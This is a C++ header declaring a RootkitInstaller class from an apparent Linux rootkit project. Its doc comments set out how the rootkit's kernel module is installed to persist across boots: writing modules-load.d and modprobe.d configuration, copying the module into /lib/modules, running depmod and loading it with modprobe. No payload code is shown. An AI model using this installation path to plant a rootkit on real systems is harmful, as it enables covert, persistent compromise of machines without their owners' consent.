#ifndef ROOTKIT_ROOTKIT_INSTALLER_H
#define ROOTKIT_ROOTKIT_INSTALLER_H

#include "rootkit/ConfigManager.hpp"
#include "rootkit/issues/Error.hpp"
#include "rootkit/issues/Logger.hpp"
#include <string>

namespace rootkit {

class RootkitInstaller {
private:
    const RtConfig& config;
    std::string module_params;
    issues::Error error;

public:
    /**
     * @brief Constructs a RootkitInstaller instance.
     * @param config Rt configuration
     * @param logger Logger
     *
     */
    RootkitInstaller(const RtConfig& config, const issues::Logger& logger);


    /**
     * @brief Install Linux rootkit module
     *
     * Orchestrates all steps of the kernel module installing process
     * 1. Writes module configuration to `/etc/modules-load.d/<module_name>.conf`
     * 2. Copies the module file to `/lib/modules/$(uname -r)/`
     * 3. Updates the module dependency database with `depmod -a`
     * 4. Loads the module with `modprobe`
     *
     * @return Returns true if all steps are completed successfully,
     * false otherwise
     */
    bool install();

private:
    /**
    * @brief Writes kernel module configuration to
    * `/etc/modules-load.d/<module_name>.conf`
    * and module params to
    * `/etc/modprobe.d/<module_name>.conf`
    * .
    * @return Returns true if the configuration file was written successfully,
    * false otherwise
    */
    bool write_module_config();

    /**
    * @brief Copies the kernel module file
    * to the system module directory (`/lib/modules/$(uname -r)/`).
    * @return Returns true if the module was copied successfully, false otherwise
    */
    bool copy_module();

    /**
    * @brief Updates the kernel module dependency database
    * by running `depmod -a`
    * @return Returns true if command was executed successfully, false otherwise
    */
    bool update_module_database();

    /**
    * @brief Loads the kernel module, by using `modprobe <moduleName>`
    * @return Returns true if the module was loaded successfully, false otherwise
    */
    bool load_module();

    /**
     * @brief Retrieves the current kernel release version.
     * Executes `uname -r` to determine the kernel version
     * @return Returns string containing the kernel release version or an empty
     * string if the command fails.
     *
     */
    std::string get_kernel_release();
};

}

#endif
